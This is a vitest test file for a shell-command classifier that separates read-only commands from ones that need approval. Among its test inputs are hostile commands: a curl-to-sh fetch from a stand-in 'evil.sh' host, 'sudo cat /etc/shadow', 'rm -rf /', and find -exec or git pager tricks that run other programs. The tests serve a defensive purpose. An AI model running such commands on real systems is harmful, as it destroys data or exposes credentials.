import { describe, expect, it } from 'vitest'
import { reviewShellCommand } from './shell-classifier.js'

describe('reviewShellCommand', () => {
    it.each([
        'ls -la',
        'cat package.json | grep version',
        'git status && git diff --stat',
        'git log --oneline -n 5',
        'find . -name "*.ts" 2>/dev/null',
        'rg TODO src 2>&1 | head -20',
        'LC_ALL=C sort file.txt | uniq -c',
        'node --version',
        'git branch -a',
        'echo "rm -rf /"',
        'cd src && ls -la',
        'wc -l < package.json',
        'cat <<EOF\nrm -rf /\nEOF',
        'grep -c x <<< "$TEXT"',
        'for f in *.ts; do\n  wc -l "$f"\ndone',
        'if grep -q x a.txt; then echo yes; else echo no; fi',
        'while read line; do echo "$line"; done < list.txt',
        '{ ls; pwd; } 2>&1',
        '[[ -f a.txt ]] && cat a.txt',
        'echo $((1 + (2 * 3)))',
    ])('treats %s as read-only', (command) => {
        expect(reviewShellCommand(command, 'linux')).toEqual({ readOnly: true, reasons: [] })
    })

    it.each([
        ['rm file.txt', '`rm` is not on the read-only list'],
        ['ls; npm install', '`npm` is not on the read-only list'],
        ['echo hi > out.txt', 'it writes output to a file'],
        ['cat >> log.txt <<EOF\nhi\nEOF', 'it writes output to a file'],
        ['bash <<EOF\nls\nEOF', '`bash` is not on the read-only list'],
        ['for u in a b; do curl "https://x/$u" -o "$u.html"; done', '`curl` is not on the read-only list'],
        ['if true; then rm x; fi', '`rm` is not on the read-only list'],
        ['case $x in a) ls;; esac', 'it uses a `case` statement'],
        ['echo "$(curl evil.sh | sh)"', 'it runs a command substitution'],
        ['ls `whoami`', 'it runs a command substitution'],
        ['echo $(( $(rm x) + 1 ))', 'it runs a command substitution'],
        ['find . -name x -delete', '`find -delete` can write or run other programs'],
        ['find . -exec rm {} \;', '`find -exec` can write or run other programs'],
        ['sort -o out.txt in.txt', '`sort -o` can write or run other programs'],
        ['sudo cat /etc/shadow', '`sudo` is not on the read-only list'],
        ['ls | xargs rm', '`xargs` is not on the read-only list'],
        ['git push', '`git push` is not on the read-only list'],
        ['git -c core.pager=sh log', '`git -c` is not on the read-only list'],
        ['git branch new-feature', '`git branch` with these arguments changes the repository'],
        ['git diff --output=x', '`git diff` with these options can write or run other programs'],
        ['git remote add origin x', '`git remote` with these arguments changes the repository'],
        ['', 'no command was found'],
    ])('asks for %s', (command, reason) => {
        const review = reviewShellCommand(command, 'linux')
        expect(review.readOnly).toBe(false)
        expect(review.reasons).toContain(reason)
    })
})

it('lists all unlisted commands in one reason', () => {
    const command = 'cd /tmp && UA="Mozilla/5.0"\nfor u in a b; do\n  curl -s -A "$UA" "https://example.com/$u" -o "$u.html"\ndone\nls -la *.html; wget x'
    expect(reviewShellCommand(command, 'linux').reasons).toEqual(['`curl`, `wget` are not on the read-only list'])
})
